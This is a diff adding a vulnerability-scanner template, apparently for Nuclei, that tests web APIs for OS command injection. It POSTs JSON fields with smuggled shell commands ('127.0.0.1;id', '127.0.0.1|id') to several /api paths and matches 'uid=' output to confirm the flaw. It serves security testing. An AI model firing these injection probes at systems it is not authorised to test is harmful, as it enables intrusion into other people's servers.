@@ -1,0 +1,25 @@
+id: m7-cmdi-json
+info:
+  name: M7 - CMDi via JSON API
+  author: Sharlix
+  severity: critical
+  description: OS command injection via JSON API parameters
+  tags: cmdi,json,api,m7hunter
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/api/exec"
+      - "{{BaseURL}}/api/run"
+      - "{{BaseURL}}/api/ping"
+
+    body: '{"host":"127.0.0.1;id","ip":"127.0.0.1|id","cmd":"id"}'
+    headers:
+      Content-Type: application/json
+
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\d+\(.*?\)"
+        part: body
